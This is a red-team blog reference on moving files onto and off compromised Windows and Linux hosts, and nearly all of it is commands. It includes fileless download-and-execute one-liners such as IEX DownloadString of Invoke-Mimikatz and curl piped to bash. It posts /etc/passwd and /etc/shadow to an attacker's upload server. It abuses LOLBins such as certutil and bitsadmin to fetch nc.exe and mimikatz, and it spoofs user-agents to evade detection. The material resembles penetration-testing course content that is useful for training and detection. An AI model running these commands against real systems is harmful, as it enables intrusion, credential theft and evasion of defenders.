<div class="post-header">
  <span class="post-date">14 February 2026 · Red Team</span>
</div>

# File Transfers — a working reference

Every technique I keep coming back to when I need to move a file onto or off
a box. Windows, Linux, code, LOLBins, and how to stay quiet.

> The scenario that keeps repeating: you have code execution on a target,
> you need to escalate, and every "obvious" transfer method is blocked. This
> is the notebook I wish I'd had the first time that happened.

---

## Why this matters

File transfers are one of those things you never think about until you need
them — and then you need them *now*. Every environment is different. Some
block HTTP but allow SMB. Some allow HTTP but web-filter `.exe` files. Some
block everything outbound except DNS.

The techniques below cover the common paths. Learn them, note which ones
worked where, and always have three options ready.

### Checksums — verify every transfer

Before and after: `md5sum` (Linux) or `Get-FileHash` (Windows). If the hashes
don't match, the file is corrupt and any further debugging is wasted time.

```bash
md5sum id_rsa
# 4e301756a07ded0a2dd6953abf015278  id_rsa
```

```powershell
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```

---

## Windows — Download

### PowerShell Base64 (no network)

Useful when you have a terminal on both ends but no direct network path.

```bash
# On attack host — encode
cat id_rsa | base64 -w 0; echo
```

```powershell
# On target — decode
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa",
  [Convert]::FromBase64String("<paste base64 here>"))
```

> **Limit:** cmd.exe has an 8,191 character max command line. For bigger
> files, use a real transfer method.

### PowerShell WebClient — DownloadFile

The classic. Works in every version of PowerShell.

```powershell
(New-Object Net.WebClient).DownloadFile(
  'https://example.com/PowerView.ps1',
  'C:\Users\Public\PowerView.ps1'
)

# Async version — returns immediately
(New-Object Net.WebClient).DownloadFileAsync(
  'https://example.com/PowerView.ps1',
  'C:\Users\Public\PowerViewAsync.ps1'
)
```

### PowerShell DownloadString — fileless

Runs the script in memory. Nothing touches disk (until the script itself does).

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://example.com/Invoke-Mimikatz.ps1')

# Or pipe-style
(New-Object Net.WebClient).DownloadString('https://example.com/Invoke-Mimikatz.ps1') | IEX
```

### Invoke-WebRequest

Slower than WebClient but has proxy awareness in some environments.

```powershell
Invoke-WebRequest https://example.com/PowerView.ps1 -OutFile PowerView.ps1

# Aliases: iwr, curl, wget
```

### Common errors

**"Internet Explorer engine is not available"** — first-launch config not
complete. Add `-UseBasicParsing`:

```powershell
Invoke-WebRequest https://example.com/PowerView.ps1 -UseBasicParsing | IEX
```

**"Could not establish trust relationship for the SSL/TLS secure channel"**
— self-signed or untrusted cert. Disable validation for the session:

```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

### SMB — Impacket smbserver

The protocol on TCP/445 that enterprise networks love. Works when HTTP is
blocked but SMB isn't.

```bash
# Attack host
sudo impacket-smbserver share -smb2support /tmp/smbshare

# With credentials (newer Windows blocks anonymous guest access)
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

```cmd
:: Target — copy directly
copy \\192.168.220.133\share\nc.exe

:: Or mount first, then copy
net use n: \\192.168.220.133\share /user:test test
copy n:\nc.exe
```

### FTP

Set up a server with `pyftpdlib`:

```bash
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21
```

Pull a file from PowerShell:

```powershell
(New-Object Net.WebClient).DownloadFile(
  'ftp://192.168.49.128/file.txt',
  'C:\Users\Public\ftp-file.txt'
)
```

Or via the built-in FTP client with a script file:

```cmd
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

---

## Windows — Upload

### PowerShell Base64 encode

```powershell
[Convert]::ToBase64String((Get-Content -Path "C:\Windows\System32\drivers\etc\hosts" -Encoding byte))
```

Copy the output, decode on the Linux side:

```bash
echo "<paste base64>" | base64 -d > hosts
md5sum hosts
```

### Invoke-RestMethod to an upload server

The `uploadserver` Python module gives you a web server with a form:

```bash
pip3 install uploadserver
python3 -m uploadserver
```

On the target:

```powershell
IEX(New-Object Net.WebClient).DownloadString(
  'https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

### Base64 over Netcat

Start a listener on the attack host, POST the base64 blob from PowerShell.

```bash
nc -lvnp 8000
```

```powershell
$b64 = [System.Convert]::ToBase64String((Get-Content -Path 'C:\...\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

### WebDAV — SMB over HTTP

When TCP/445 is blocked outbound but the target's redirector still falls back
to WebDAV on 80/443.

```bash
sudo pip3 install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

```cmd
dir \\192.168.49.128\DavWWWRoot

copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
```

> **Note:** `DavWWWRoot` is a special keyword — it tells the Windows
> Mini-Redirector you're connecting to the server root. No such folder exists
> on the actual server.

### FTP upload

```bash
sudo python3 -m pyftpdlib --port 21 --write
```

```powershell
(New-Object Net.WebClient).UploadFile(
  'ftp://192.168.49.128/ftp-hosts',
  'C:\Windows\System32\drivers\etc\hosts')
```

---

## Linux — Download

### Base64 (no network)

```bash
# Encode
cat id_rsa | base64 -w 0; echo
```

```bash
# Decode on target
echo -n '<base64 blob>' | base64 -d > id_rsa
md5sum id_rsa
```

### wget and curl

```bash
wget https://example.com/LinEnum.sh -O /tmp/LinEnum.sh
curl -o /tmp/LinEnum.sh https://example.com/LinEnum.sh
```

### Fileless via pipes

Same commands, but pipe into an interpreter instead of writing to disk:

```bash
curl https://example.com/LinEnum.sh | bash
wget -qO- https://example.com/hello.py | python3
```

### Bash `/dev/tcp` — when nothing else is available

Bash 2.04+ compiled with `--enable-net-redirections`:

```bash
exec 3<>/dev/tcp/10.10.10.32/80
echo -e "GET /LinEnum.sh HTTP/1.1\n\n" >&3
cat <&3
```

### SSH / SCP

```bash
# Enable SSH on the attack host
sudo systemctl enable ssh
sudo systemctl start ssh

# Pull a file from the target
scp user@10.10.10.32:/root/myroot.txt .
```

---

## Linux — Upload

### Upload server

```bash
# HTTPS example with a self-signed cert
pip3 install uploadserver
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

mkdir https && cd https
sudo python3 -m uploadserver 443 --server-certificate /path/to/server.pem
```

```bash
# From target
curl -X POST https://192.168.49.128/upload \
  -F 'files=@/etc/passwd' \
  -F 'files=@/etc/shadow' \
  --insecure
```

### Quick-and-dirty web server

If the target can reach your attack host:

```bash
python3 -m http.server          # Python 3
python2.7 -m SimpleHTTPServer   # Python 2
php -S 0.0.0.0:8000             # PHP
ruby -run -e httpd . -p8000     # Ruby
```

### SCP upload

```bash
scp /etc/passwd user@10.10.10.32:/home/user/
```

---

## Transferring files with code

Every language is a file transfer tool if you're brave enough.

### Python

```bash
# Python 2
python2.7 -c 'import urllib; urllib.urlretrieve("https://example.com/LinEnum.sh", "LinEnum.sh")'

# Python 3
python3 -c 'import urllib.request; urllib.request.urlretrieve("https://example.com/LinEnum.sh", "LinEnum.sh")'
```

### PHP

```bash
# file_get_contents + file_put_contents
php -r '$file = file_get_contents("https://example.com/LinEnum.sh");
        file_put_contents("LinEnum.sh", $file);'

# fopen + stream copy
php -r 'const BUFFER = 1024;
        $fremote = fopen("https://example.com/LinEnum.sh", "rb");
        $flocal  = fopen("LinEnum.sh", "wb");
        while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); }
        fclose($flocal); fclose($fremote);'

# Pipe straight to bash (fileless)
php -r '$lines = @file("https://example.com/LinEnum.sh");
        foreach ($lines as $line) { echo $line; }' | bash
```

### Ruby

```bash
ruby -e 'require "net/http";
         File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://example.com/LinEnum.sh")))'
```

### Perl

```bash
perl -e 'use LWP::Simple;
         getstore("https://example.com/LinEnum.sh", "LinEnum.sh");'
```

### JavaScript (Windows — cscript)

Save as `wget.js`:

```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), false);
WinHttpReq.Send();

var BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

```cmd
cscript.exe /nologo wget.js https://example.com/PowerView.ps1 PowerView.ps1
```

### VBScript

Save as `wget.vbs`:

```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

```cmd
cscript.exe /nologo wget.vbs https://example.com/PowerView.ps1 PowerView.ps1
```

---

## Miscellaneous methods

### Netcat / Ncat

**Listening on the target, sending from the attack host:**

```bash
# Target
nc -l -p 8000 > SharpKatz.exe
# Or with Ncat (closes when transfer completes)
ncat -l -p 8000 --recv-only > SharpKatz.exe
```

```bash
# Attack host
nc -q 0 192.168.49.128 8000 < SharpKatz.exe
ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

**Reverse — listening on attack host, connecting from target:**

```bash
# Attack host
sudo nc -l -p 443 -q 0 < SharpKatz.exe
sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

```bash
# Target
nc 192.168.49.128 443 > SharpKatz.exe
ncat 192.168.49.128 443 --recv-only > SharpKatz.exe

# Bash-only fallback
cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

### PowerShell Remoting (WinRM)

When HTTP, HTTPS, and SMB are all blocked. Uses TCP/5985 (HTTP) and 5986 (HTTPS).

```powershell
# Confirm connectivity
Test-NetConnection -ComputerName DATABASE01 -Port 5985

# Create a session
$Session = New-PSSession -ComputerName DATABASE01

# Copy local → remote
Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\

# Copy remote → local
Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

### RDP — drive mounting

Mount a local folder so it appears inside the RDP session as `\\tsclient\`.

```bash
# Linux — rdesktop
rdesktop 10.10.10.132 -d DOMAIN -u administrator -p 'Password@' \
  -r disk:linux='/home/user/rdesktop/files'

# Linux — xfreerdp
xfreerdp /v:10.10.10.132 /d:DOMAIN /u:administrator /p:'Password@' \
  /drive:linux,/home/user/filetransfer
```

Inside the session, browse to `\\tsclient\linux\`.

On Windows: use `mstsc.exe` → **Local Resources** → **More** → **Drives**.

> **Note:** Mounted drives are not accessible to other users on the target,
> even if someone hijacks the RDP session later.

---

## Protected file transfers

If you're moving credentials, NTDS.dit, enumeration data — anything
sensitive — **encrypt it before it leaves the network**, or use an encrypted
transport (SSH, SFTP, HTTPS).

### Windows — Invoke-AESEncryption.ps1

Encrypts a file or a string with AES-256 CBC, key derived from a passphrase
via SHA-256.

```powershell
Import-Module .\Invoke-AESEncryption.ps1

Invoke-AESEncryption -Mode Encrypt -Key "p4sswOrd" -Path .\scan-results.txt
# → writes scan-results.txt.aes

Invoke-AESEncryption -Mode Decrypt -Key "p4sswOrd" -Path .\scan-results.txt.aes
# → writes scan-results.txt
```

Use a **unique password per engagement**. Never reuse.

### Linux — OpenSSL

```bash
# Encrypt
openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc

# Decrypt
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
```

Then transfer over HTTPS, SFTP, or SSH.

---

## Catching files over HTTP/S

The two most firewall-friendly protocols. Also the ones most likely to be
inspected by an IDS.

### Nginx — upload endpoint

Minimal config, no PHP execution risk.

```bash
sudo mkdir -p /var/www/uploads/SecretUploadDirectory
sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
```

Create `/etc/nginx/sites-available/upload.conf`:

```nginx
server {
    listen 9001;

    location /SecretUploadDirectory/ {
        root /var/www/uploads;
        dav_methods PUT;
    }
}
```

```bash
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
sudo rm /etc/nginx/sites-enabled/default
sudo systemctl restart nginx
```

Upload with a PUT:

```bash
curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
```

> **Why Nginx over Apache:** Apache's PHP module loves to execute anything
> ending in `.php`. With Nginx, enabling that is deliberately not simple —
> which is exactly what you want for an upload endpoint.

---

## Living off the land

Every binary on the system is a potential file transfer tool. Two databases
document them:

| Platform | Project | URL |
|----------|---------|-----|
| Windows | LOLBAS | lolbas-project.github.io |
| Linux | GTFOBins | gtfobins.github.io |

### LOLBAS — CertReq.exe

Uploads a file via a POST request to any HTTP endpoint you control:

```cmd
certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
```

Catch it with netcat on the other side.

### LOLBAS — Bitsadmin

```powershell
bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\Public\Desktop\nc.exe
```

Or via PowerShell's BITS cmdlets:

```powershell
Import-Module bitstransfer
Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```

### LOLBAS — Certutil

The "de facto wget for Windows". Note that AMSI now flags it as suspicious in
many environments:

```cmd
certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
```

### GTFOBins — OpenSSL

OpenSSL can send files `nc`-style. Handy because it's already on almost every
Linux box.

```bash
# Attack host — create a cert, start the server
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```

```bash
# Target — pull the file
openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```

### GfxDownloadWrapper.exe

Installed on some Windows 10 systems as part of Intel Graphics. Downloads a
file from a URL to a local path, and is often on app-whitelist policies:

```powershell
GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
```

---

## Detection & evasion

### What defenders look for

- **User-Agent strings.** Every HTTP client identifies itself. A
  `WindowsPowerShell/5.1` UA fetching a `.exe` stands out against a fleet
  of Chrome and Edge.

| Technique | User-Agent |
|-----------|-----------|
| Invoke-WebRequest | `Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1` |
| WinHttpRequest | `Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)` |
| Msxml2 | `Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; ... Trident/7.0)` |
| Certutil | `Microsoft-CryptoAPI/10.0` |
| BITS | `Microsoft BITS/7.8` |

- **Command-line signatures.** `certutil -urlcache -split -f` is a
  textbook IOC.
- **Anomalous destinations.** A workstation reaching GitHub at 2 a.m. is
  worth a look.

### Changing the User-Agent

```powershell
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent
```

List all available built-in UAs:

```powershell
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() |
  Select-Object Name, @{label="User Agent"; Expression={ [Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name) }} |
  Format-List
```

Options: `InternetExplorer`, `FireFox`, `Chrome`, `Opera`, `Safari`.

### Using a LOLBin that isn't blocked

Application whitelisting may block PowerShell or Netcat. A LOLBin that's
already trusted in the environment slides right past. `GfxDownloadWrapper.exe`
is a common one on Intel-based Windows 10 fleets; check LOLBAS for others
that fit the target.

---

## Closing thoughts

There are dozens of ways to move a file. The right one depends on what's
allowed in, what's allowed out, and what tools exist on both ends.

**Practice order I'd recommend:**

1. PowerShell WebClient (download) — the baseline.
2. SMB via Impacket — the fallback when HTTP is filtered.
3. Base64 encode/decode — for tiny files and no-network situations.
4. LOLBAS/GTFOBins — when the obvious binaries are blocked.
5. Encrypt before you send anything sensitive — no exceptions.

Note down what worked where. The next time you're on a fresh box with a
different firewall, you'll know exactly which three options to try first.